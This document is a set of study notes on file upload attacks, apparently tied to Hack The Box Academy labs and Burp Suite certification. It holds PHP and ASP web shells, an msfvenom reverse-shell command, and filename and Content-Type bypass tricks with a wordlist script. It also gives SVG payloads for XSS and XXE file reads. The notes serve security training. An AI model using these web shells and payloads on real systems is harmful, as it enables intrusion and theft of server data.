# File Upload Attacks  

>[Burp Suite Certified Practitioner study notes on file upload bypass](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#file-uploads)  

## Web Shells

| **Web Shell**   | **Description**   |
| --------------|-------------------|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php echo file_get_contents('/etc/hostname'); ?>` | PHP script that executes to get the (hostname) on the back-end server [Arbitrary File Upload](https://academy.hackthebox.com/module/136/section/1260) |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<?php echo shell_exec($_GET[ "cmd" ]); ?>` | Alternative PHP Webshell using shell_exec function. |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| `/usr/share/seclists/Web-Shells` | List of webshells for frameworks such as: CFM,FuzzDB,JSP,Laudanum, Magento, PHP, Vtiger and WordPress. |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| **Command**   | **Description**   |
| --------------|-------------------|
| **Client-Side Bypass** | [Bypass the client-side file type validations](https://academy.hackthebox.com/module/136/section/1280) |
| `[CTRL+SHIFT+C]` | Toggle Page Inspector |
| **Blacklist Bypass** | [Blacklist Filters](https://academy.hackthebox.com/module/136/section/1288) Use Burp Suite intruder to upload a single file name with list possible extensions. Then use intruder again to perform GET request on all the files upload to identify PHP execution on target. |
| `shell.phtml` | Uncommon Extension |
| `shell.pHp` | Case Manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
| **Whitelist Bypass** | [Whitelisting Extensions](https://academy.hackthebox.com/module/136/section/1289) |
| `shell.jpg.php` | Double Extension bypass example|
| `shell.php.jpg` | Reverse Double Extension |

### Extra Client Side  

>Client side html code alter to allow file upload validation bypass by removing `validate()`, optional clearing the `onchange` and `accept` values.  

![uploads-client-side-html](/images/uploads-client-side-html.png)  

### Extra Wordlist Script  

>Character Injection - Before/After Extension to generate list of possible filenames to bypass file upload filters on white or black listings.  

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> filenames_wordlist.txt
        echo "shell$ext$char.jpg" >> filenames_wordlist.txt
        echo "shell.jpg$char$ext" >> filenames_wordlist.txt
        echo "shell.jpg$ext$char" >> filenames_wordlist.txt
    done
done
```  

## Content/Type Bypass  

| **Command**   | **Description**   |
| --------------|-------------------|
| [Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) | List of [Web Content-Types](https://academy.hackthebox.com/module/136/section/1290) |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/Magic Bytes |

>Example of the Payload code for the file being uploaded, `<?php echo file_get_contents('/flag.txt'); ?>`, add `GIF8` at top of file body and keep the file name as `shell.php`. The `Content-Type:` is then the injection payload position for Burp Suite Intruder using the above wordlists.  


## Limited Uploads

| **Potential Attack**   | **File Types** |
| --------------|-------------------|
| `XSS` | HTML, JS, SVG, GIF |
| `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
| `DoS` | ZIP, JPG, PNG |

# Exercises  

## Upload Filters    

>This [web server exercise](https://academy.hackthebox.com/module/136/section/1290) employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"

>Client-Side  
>HTML script functions validation cleared before loading DOM.

![type-filters-exercise-step1](/images/type-filters-exercise-step1.png)  

>Blacklist & Whitelist  
>Fuzzing of file names with various character injections to the extensions reveal valid filenames, `shell.jpg:.phar`

>determine valid filename and extension.

>Content-Type & MIME-type  
The content type and mime type combination is checked by backend and fuzzing wordlist of content type, identify valid types as:  

```
Content-Type: image/gif
GIF8
```  

![type-filters-exercise-step](/images/type-filters-exercise-step3.png)  

>Get sensitive info flag: `GET /profile_images/shell.jpg:.phar`.  

## XSS & XXE in Uploads  

>Burp Sutie Certified Practitioner Study Exercises and notes:
* [BSCP - XXE via SVG Image upload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#xxe-via-svg-image-upload)  
* [BSCP - XSS SVG Upload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#xss-svg-upload)  

>This File Upload exercise contains an vulnerable upload functionality that should be secure against arbitrary file uploads. But the content of the files can execute server side to read sensitive files using XXE or trigger stored XSS.  

>XSS inside SVG image file: `htb.svg`, uploaded to target.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

>When XML SVG file is upload the XSS is triggered.  

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```  

>Above will render on the index landing page and retrieve the contents of `/flag.txt`.  

>Source code of PHP files can be trieved using Base64 to prevent execution on server, using below XML payload file upload:  

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```  

![xxe-svg-upload-base64](/images/xxe-svg-upload-base64.png)  

# Skills Assessment - File Upload Attacks  

>[Extra Exercise](https://academy.hackthebox.com/module/136/section/1310)  

>You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.
>Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.  


 